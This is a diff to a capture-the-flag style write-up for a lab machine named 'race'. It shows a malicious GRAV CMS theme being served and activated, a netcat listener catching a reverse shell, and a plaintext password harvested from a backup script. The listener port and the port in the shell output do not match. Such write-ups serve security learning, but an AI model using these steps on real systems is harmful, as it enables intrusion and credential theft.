@@ -198,6 +198,58 @@ We change the location of the response to download the malicious theme
 <Terminal prompt="$">
 10.129.234.209 - - [21/Aug/2026 19:55:50] "GET /badaerial.zip HTTP/1.1" 200 -
 </Terminal>
+The malicious theme is being installed we activate it.
+<div class="writeup-image">
+  <img
+    src="/htb/images/race/maltheme.png"
+    alt="GRAV CMS login page"
+  />
+</div>
+We set the listener
+<Terminal prompt="$">
+nc -lvnp 4444
+</Terminal>
+We reload the page we get a shell
+<Terminal prompt="$">
+nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.234.211 40736
+bash: cannot set terminal process group (1139): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@race:/var/www/html/racers$ 
+</Terminal>
+## Lateral Movement
+We can see that the Max user's home directory is readable, and we can read the files under
+<Terminal prompt="$">
+www-data@race:/home/max$ ls -la
+total 36
+drwxr-xr-x 5 max max 4096 Dec 9 2023 .
+drwxr-xr-x 4 root root 4096 Dec 3 2023 ..
+lrwxrwxrwx 1 root root 9 Dec 3 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 max max 220 Jan 6 2022 .bash_logout
+-rw-r--r-- 1 max max 3771 Jan 6 2022 .bashrc
+drwx------ 2 max max 4096 Dec 3 2023 .cache
+drwxrwxr-x 3 max max 4096 Dec 9 2023 .local
+-rw-r--r-- 1 max max 807 Jan 6 2022 .profile
+drwxrwxr-x 2 max max 4096 Dec 4 2023 bin
+lrwxrwxrwx 1 max max 29 Dec 9 2023 race-scripts -> /usr/local/share/racescripts
+-rw-r----- 1 root max 33 Apr 16 04:17 user.txt
+www-data@race:/home/max$ ls /usr/local/share/race-scripts/
+backup offsite-backup.sh
+</Terminal>
+Reading offsite-backup.sh we can see Max's password
+<Terminal prompt="$">
+www-data@race:/home/max$ cat /usr/local/share/race-scripts/offsite-backup.sh
+#!/usr/bin/bash
+OFFSITE_HOST="offsite-backup.race.vl"
+SOURCE_DIR="/var/www/html/racers/backup/"
+# Disabled USER/PASS for security reasons. Will be provided via environment from
+cron.
+# OFFSITE_USER="max"
+# OFFSITE_PASS="ruxai0GaemaS1Rah"
+/usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T
+$SOURCE_DIR sftp://$OFFSITE_HOST/backups/
+</Terminal>
 ## Escalade de privilèges
 
 Détails de l'escalade.
